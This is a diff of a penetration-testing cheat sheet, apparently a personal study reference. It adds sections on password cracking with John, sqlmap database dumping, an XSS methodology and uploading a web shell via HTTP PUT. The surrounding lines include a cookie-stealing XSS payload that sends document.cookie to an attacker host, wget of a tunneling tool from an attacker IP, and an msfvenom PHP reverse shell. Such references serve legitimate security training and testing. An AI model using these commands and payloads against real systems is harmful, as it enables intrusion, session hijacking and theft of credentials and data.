@@ -17,7 +17,10 @@ nmap -p<port> --script=vuln -v <target-IP>
 nmap -p- -sS --open -T4 -n -Pn -iL targets -oN alltargetports
 nmap -sCV -p<ports> -Pn -vvv <ip-to-scan> -oN portversion
 ```
-
+## Subdomains
+```sh
+sublist3r -d <target-nameaddress>
+```
 ## IP Route
 ```sh
 ip route add <Network-range> via <router-IP> dev <interface>
@@ -43,14 +46,22 @@ wget <attacker-ip>:<port>/chisel
 ```sh
 ./chisel client <attacker-ip> 127.0.0.1:<port>:<target-ip>:<port>
 ```
-## John
+## John 
+**Dictionary crack**
 ```sh
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
 unshadow passwd shadow > unshadowed.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 ```
+**Crack other encrypted files**
+```sh
+locate *2john # First find the tools to export from the encrypted file a hash
+# RAR Ex: 
+rar2john ./encrypted.rar > ./encrypted.rar.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt ./encrypted.rar.hash # Finally, crack it with John
+```
 
-## dirb
+## Dirb
 ```sh
 dirb http://<target-ip>/
 dirb http://<target-ip>/dir -u admin:admin
@@ -64,28 +75,29 @@ nc -lvp 1234
 ```
 **Banner Grabbing**
 ```sh
-nc -nv <target-ip> <port>
+nc -nv <target-ip> <port> # No https
+openssl s_client -connect 10.10.10.10:443 # Https, or in Netcat use --ssl flag.
 ```
 ## SQLMap
-#### Check if injection exists
+#### 1. Check if injection exists
 ```sh
 sqlmap -r Post.req
 sqlmap -u "http://<target-ip>/file.php?id=1" -p id
 sqlmap -u "http://<target-ip>/login.php" --data="user=admin&password=admin"
 ```
-#### Get database if injection Exists
+#### 2. Get database if injection Exists
 ```sh
 sqlmap -r login.req --dbs
 sqlmap -u "http://<target-ip>/file.php?id=1" -p id --dbs
 sqlmap -u "http://<target-ip>/login.php" --data="user=admin&password=admin" --dbs
 ```
-#### Get Tables in a Database
+#### 3. Get Tables in a Database
 ```sh
 sqlmap -r login.req -D dbname --tables
 sqlmap -u "http://<target-ip>/file.php?id=1" -p id -D dbname --tables
 sqlmap -u "http://<target-ip>/login.php" --data="user=admin&password=admin" -D dbname --tables
 ```
-#### Get data in a Database tables
+#### 4. Get data in a Database tables
 ```sh
 sqlmap -r login.req -D dbname -T table_name --dump
 sqlmap -u "http://<target-ip>/file.php?id=1" -p id -D dbname -T table_name --dump
@@ -105,6 +117,11 @@ hydra http://<target-ip>/ http-post-form "/login.php:user=^USER^&password=^PASS^
 ```
 
 ## XSS
+**Methodology**
+1. Find a field with user input data and that is reflected to the page.
+2. Test with html tags (\<i\>, \<h1\>) and see how it is processed.
+3. Test with Javascript code as alert(), and see how it is processed.
+Ex:
 ```sh
 <script>alert(1)<script>
 <ScRiPt>alert(1)<ScRiPt>
@@ -115,7 +132,7 @@ hydra http://<target-ip>/ http-post-form "/login.php:user=^USER^&password=^PASS^
 <script>var i = new Image();i.src="http://<attacker-ip>/log.php?q="+document.cookie;</script>
 
 #Attacker Machine:
-nc -vv -k -l -p 80
+nc -vv -k -l -p 80 #Obtain the cookie and use Cookie Quick Manager to use it in the website
 ```
 *XSS filter bypass cheatsheet*\
 https://owasp.org/www-community/xss-filter-evasion-cheatsheet
@@ -137,6 +154,14 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 **PHP non meterpreter**
 ```sh
 msfvenom -p php/reverse_php LHOST=<Host-IP> LPORT=<Port> -f raw > shell.php
+```
+## Upload a Shell with HTTP VERB PUT
+```sh
+wc -m shell.php # First we need to know the size of the file
+
+PUT /shell.php # With BurpSuite create this request and send it
+Content-type: text/html
+Content-length: x
 ```
 ## Metasploit Meterpreter autoroute
 ```sh
@@ -198,9 +223,13 @@ hashdump
 ## Windows Command Line
 **Search for a file starting from current directory**
 ```sh
-dir /b/s "*.conf"
-dir /b/s "*.txt"
-dir /b/s "*filename"
+# Find files through their filename
+dir /b/s/p "*.conf"
+dir /b/s/p "*.txt"
+dir /b/s/p "*filename"
+
+#Find files through their content
+findstr /s/m/i administrator c:\users
 ```
 **Routing table**
 ```sh
